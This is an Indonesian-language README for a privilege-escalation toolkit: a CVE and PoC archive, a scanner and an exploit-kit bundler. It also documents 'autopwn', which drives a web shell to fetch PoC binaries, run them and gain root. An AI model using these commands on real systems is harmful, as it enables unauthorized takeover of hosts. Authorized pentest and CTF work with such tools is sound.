# AutoRoot — Toolkit Riset LPE: CVE → Scan → Kit PoC

AutoRoot adalah toolkit riset **local privilege escalation (LPE)** yang merangkai tiga komponen
dalam satu alur kerja: arsip CVE lokal, scanner ala LinPEAS/WinPEAS, dan bundler kit PoC.

| Komponen | Isi |
|---|---|
| **cve-lpe** | Arsip **23.847 CVE** LPE (NVD API 2.0 + CISA KEV) + indeks **1.302 repo PoC publik**: 508 biner ELF terkompilasi, 1.594 sumber Linux, 623 sumber Windows |
| **lpescan** | Scanner full enumerasi (versi + misconfig, ±42 cek Linux / ±27 cek Windows) yang mencocokkan hasilnya ke dataset CVE. Tiga implementasi: Python stdlib-only (referensi), **bash** (Linux tanpa python), **PowerShell 5.1** (Windows tanpa python) — full parity. **Read-only**, tanpa jaringan |
| **buildkit** | Merakit kit per target: biner/sumber PoC yang cocok + resep kompilasi + manifest, jadi satu zip |

> ⚠️ **HANYA UNTUK RISET TERAUTORISASI** — lab sendiri, CTF, atau target dengan izin tertulis.
> Scanner tidak pernah mengeksekusi PoC; buildkit hanya menyalin/meng-zip.
> Mengeksploitasi sistem tanpa izin adalah ilegal.

## Alur kerja

```
NVD API 2.0 + CISA KEV
        │  fetch → cve-lpe/ (dataset + indeks PoC)
        ▼
build-scanner.py → dist/lpescan.py + dist/lpe-data.json.gz      ◄── mesin arsip
        │  copy 2 file ke target (scp/flashdisk)
        ▼
lpescan.py → scan-report-{host}-{ts}.json                       ◄── server target (read-only)
        │  bawa pulang report
        ▼
buildkit.py → kits/lpe-kit-{host}-{ts}.zip                      ◄── mesin arsip
        │  review kit → deploy ke target lab
        ▼
jalankan PoC di VM uji (REMnux / FLARE VM)
```

## Struktur repositori

```
AutoRoot/
├── README.md                  # dokumen ini
├── cve-lpe/                   # arsip dataset CVE LPE
│   ├── cve-lpe-full.json      # 23.847 record (format ringkas 9 key)
│   ├── cve-lpe-full.csv
│   ├── linux/ windows/ other/ # split per OS per tahun
│   ├── pocs/                  # PoC publik: bin/ src/ src-windows/ poc-index.csv
│   └── README.md              # statistik dataset per OS/tahun
└── lpescan/                   # scanner + bundler
    ├── lpescan.py             # scanner (source, hand-maintained) — REFERENSI
    ├── lpescan.sh             # port bash (Linux tanpa python, bash4+awk POSIX)
    ├── lpescan.ps1            # port PowerShell 5.1 (Windows tanpa python)
    ├── tables.py              # tabel mapping: pkg→CPE, distro→CPE, release→build, GTFO-SUID
    ├── build-scanner.py       # regen dist/ dari dataset terkini (idempoten) + emit TSV port
    ├── buildkit.py            # bundler kit PoC (mesin arsip saja)
    ├── dist/                  # UNIT DEPLOY: python = 2 file; bash/PS = scanner + TSV
    ├── kits/                  # output kit zip (generated)
    └── README.md              # workflow detail per langkah + matriks deploy per impl
```

## Dataset — cve-lpe

- **Sumber**: NVD API 2.0 (query keyword variants + daftar cveId kurasi) + CISA KEV
- **23.847 CVE** (1989–2026): linux 3.971 / windows 6.114 / other 13.762
- Severity: CRITICAL 1.942 · HIGH 16.283 · MEDIUM 5.380 · LOW 239
- **KEV** (CISA Known Exploited Vulnerabilities): **299** record — diprioritaskan di report
- Record tanpa `affected[]`: 2.843 (di-skip saat matching)
- Format record: `id, published, score, severity, description, affected[], os, kev`
- `affected[]` = CPE 2.3 `vendor:product [range]` — range bisa `[all]`, exact `[6.8]` / `[7.0_s390x]`,
  atau bound `[<10.0.22631.4751]`
- PoC: `pocs/poc-index.csv` (3.738 baris → 1.302 CVE) dipetakan ke `pocs/bin/` (ELF),
  `pocs/src/` (repo Linux), `pocs/src-windows/` (repo Windows)

## lpescan — scanner

Matching CVE 4 tier, prioritas **kernel > package > os-build > distro-pin**:

| Tier | Cara kerja | Confidence |
|---|---|---|
| kernel | `uname -r` vs range/pin `linux:linux_kernel` (8.000+ entry, `[all]` di-skip kecuali KEV); kernel distro (Ubuntu/Debian/Kali dll.) di-flag `[BP]` bila CVE dipublikasikan >60 hari sebelum build date — nomor ABI distro (`5.15.0-191`) tidak setara patch level upstream | high, turun ke possible jika `[BP]` |
| package | dpkg/rpm vs tabel `PKG_TO_CPE` (sudo, glibc, polkit, openssl, systemd, firefox, dll.) | high |
| os-build | build Windows (`10.0.22631.4751`) vs bound NVD + tabel release→build | high |
| distro-pin | os-release vs `debian:debian_linux` / `canonical:ubuntu_linux` dll. | possible |

Kelas **container-escape** (`[ESC]`): CVE runc/containerd/buildkit/docker/kernel
yang berpotensi escape container → host di-flag `escape_class` di report. Bila
scanner berjalan di dalam container, blok TARGET memberi catatan bahwa match
`[ESC]` bisa menyentuh host (verifikasi versi runtime dari sisi host).

PEAS checks — **±42 cek Linux**: system info (ASLR, kptr, userns), users/groups, sudo
(NOPASSWD/env_keep), SUID/SGID + daftar GTFOBins, capabilities berbahaya, PATH writable,
cron (wildcard injection), perms passwd/shadow, docker/kube, port root + redis no-auth,
systemd unit writable, NFS `no_root_squash`, kredensial (history, ssh keys, .aws, .env,
wp-config, .git-credentials), sesi tmux/screen, ld.so.preload/LD_PRELOAD.
**±27 cek Windows**: build/UBR/EditionID, hotfix, unquoted service path + dir biner writable,
AlwaysInstallElevated, token privilege (`whoami /priv` → saran Potato/PrintSpoofer/robocopy),
stored credentials (cmdkey/vault/SAM/autologon/GPP cpassword), UAC, autoruns, DLL/path, defense.

```bash
# mesin arsip — setelah dataset di-update
python3 build-scanner.py                    # regen dist/ + laporan coverage tabel
python3 dist/lpescan.py --selftest          # 35 asersi (version engine + backport + container-escape)

# target Linux
python3 lpescan.py                          # output konsol berwarna + scan-report-*.json
python3 lpescan.py --json-only              # hanya tulis report
python3 lpescan.py --report /tmp/r.json --no-color

# target Windows (mis. FLARE VM — butuh python3 di target)
python3 lpescan.py --report scan-win.json
```

**Tanpa python di target** — dua port full-parity (matching + PEAS + report JSON
identik, buildkit tetap jalan): `lpescan.sh` untuk Linux (bash 4+ + awk POSIX)
dan `lpescan.ps1` untuk Windows (PowerShell 5.1). Flag sama:
`--report/--json-only/--no-color/--selftest`.

```bash
bash lpescan.sh --selftest                              # 30 asersi
pwsh -NoProfile -File lpescan.ps1 -Selftest             # 37 asersi (cross-platform)

# deploy Linux tanpa python: lpescan.sh + 7 TSV (lpe-cves-linux, -meta, -pkgmap,
#   -distromap, -gtfo, -pocs, -info)
# deploy Windows tanpa python: lpescan.ps1 + 6 TSV (lpe-cves-win, -meta, -pocs,
#   -winrelease, -winprivs, -info)
# Windows:
powershell -ExecutionPolicy Bypass -File lpescan.ps1 -Report scan-win.json
```

Divergence terdokumentasi (kosmetik): `description` di report bash/PS dibatasi
600 char (meta TSV), urutan listing SUID/glob bisa beda (find vs os.walk) —
himpunan temuan identik. Detail lengkap: `lpescan/README.md`.

## buildkit — bundler kit

```bash
python3 buildkit.py --report scan-report-*.json [--include-possible]
# → kits/lpe-kit-{host}-{ts}.zip
#    binaries/       ELF PoC terkompilasi (Linux)
#    linux-src/      zip sumber + petunjuk build (make/gcc)
#    windows-src/    zip sumber + resep kompilasi (msbuild — jalankan di FLARE VM)
#    KIT-README.md   per-CVE: constraint vs versi terdeteksi, deskripsi, repo, path kit
#    manifest.csv
```

Seleksi: hanya CVE yang punya PoC publik, urut **KEV dulu → score tertinggi**.
Match confidence `possible` (distro-pin/`[all]`) tidak disertakan kecuali `--include-possible`.
**Buildkit tidak pernah mengeksekusi apa pun** — murni copy/zip/markdown.

## autopwn — otomasi end-to-end via web shell (scan → biner PoC → eksekusi)

```bash
python3 lpescan/autopwn.py --shell http://TARGET/uploads/shell.php   # full: scan→root
python3 lpescan/autopwn.py --shell URL --scan-only                   # scan + PLAN.md saja
python3 lpescan/autopwn.py --shell URL --github                      # biner dari GitHub (raw)
python3 lpescan/autopwn.py --selftest                                # gate offline
```

Orkestrator sisi penyerang: deploy scanner ke target lewat web shell → ambil
report → pilih biner PoC dari arsip lokal `cve-lpe/pocs/bin/` → upload →
eksekusi checker/exploit → verifikasi root. Scanner tetap read-only; yang
mengeksekusi PoC hanya tool ini, hanya terhadap target dari `--shell`.
Pengiriman biner tiga lapis: `--fetch-base URL` (hosting eksternal; `--github`
= langsung dari repo ini via raw.githubusercontent) → HTTP server ephemeral di
mesin arsip (default; target tarik via `python3 urllib`, tanpa hosting publik)
→ fallback chunk base64 via shell. Terbukti E2E di lab (2026-09-28): dua box
Ubuntu 24.04 di-root via CVE-2026-31431 CopyFail.

**Khusus target terautorisasi.** Produksi: wajib `--production` +
`--confirm-production` (banner risiko). Detail: `lpescan/README.md`.

## 20 metode LPE yang diotomasi

Ringkasan vektor LPE klasik dan di mana lpescan mendeteksinya:

| # | Metode | Dideteksi lpescan? |
|---|---|---|
| 1 | Eksploitasi kernel (`uname -a`) | ✅ tier kernel |
| 2 | SUID binaries (GTFOBins) | ✅ cek SUID + daftar GTFO |
| 3 | Sudo tanpa password (`sudo -l`) | ✅ cek NOPASSWD/ALL/env_keep |
| 4 | Web service localhost tanpa auth | ✅ port proses root + redis no-auth |
| 5 | Docker daemon (port 2375 / socket) | ✅ cek docker.sock + grup docker |
| 6 | Redis misconfiguration | ✅ cek redis no-auth |
| 7 | Kredensial di shell history | ✅ grep history (passw/token) |
| 8 | SSH key hijacking | ✅ cari id_* / .pem / .key |
| 9 | TTY inject / session hijack | ✅ cek socket tmux/screen |
| 10 | Pkexec (CVE-2021-4034) | ✅ tier package polkit |
| 11 | Writable `/etc/passwd` | ✅ cek perms passwd/shadow |
| 12 | Wildcard injection cron | ✅ cek cron + pola `tar *` |
| 13 | LD_PRELOAD via sudo | ✅ cek env_keep + ld.so.preload |
| 14 | D-Bus service exploitation | ⚠️ sebagian (unit systemd writable) |
| 15 | NFS `no_root_squash` | ✅ cek /etc/exports |
| 16 | Capabilities (`getcap`) | ✅ getcap + cap berbahaya |
| 17 | Password reuse (wp-config/db) | ✅ cek wp-config/.env/.git-credentials |
| 18 | Python library hijacking | ✅ cek PATH writable |
| 19 | Writable PATH | ✅ cek isi + perms PATH |
| 20 | Automated recon (LinPEAS) | ✅ **lpescan ini dia** |

## Requirements

- Python **3.8+** — **stdlib only, tanpa pip, tanpa jaringan** di target (unit deploy = 2 file)
- Target Linux apa pun (dpkg/rpm) atau Windows dengan python3 (mis. FLARE VM)
- **Tanpa python**: `lpescan.sh` (bash 4+ + awk POSIX, tanpa jq) atau `lpescan.ps1` (Windows PowerShell 5.1)
- Kompilasi PoC Windows: FLARE VM dengan msbuild (resep dicetak otomatis oleh buildkit)

## Catatan pengembangan

- Dataset di-refresh lewat pipeline NVD (keyword + cveId kurasi — keyword murni melesetkan
  CVE kernel 2026 dengan pola deskripsi "In the Linux kernel..." seperti DirtyFrag/CopyFail);
  setelah refresh tinggal jalankan ulang `build-scanner.py`
- cveId kurasi juga menutup lubang keyword untuk **runc/containerd/buildkit**
  (13 CVE: CVE-2019-5736, CVE-2024-21626, CVE-2021-30465, dll.) — dasar kelas `[ESC]`
- `--selftest` memvalidasi version engine terhadap bentuk string dataset nyata
  (arch suffix `7.0_s390x`, patch-level `1.9.5p2`, build Windows, pin exact `[6.8]`, dll.)

## Disclaimer

**FOR EDUCATIONAL PURPOSES ONLY.** Tool ini dibuat untuk **pendidikan dan riset
keamanan terautorisasi** (lab pribadi, CTF, pentest dengan izin). Penulis tidak
bertanggung jawab atas penggunaan yang melanggar hukum. Review setiap PoC
sebelum dijalankan — verifikasi offset, arsitektur, dan constraint versi.

## Lisensi

Kode tool: **MIT** (`LICENSE`). Dataset berasal dari NVD/CISA (domain publik).
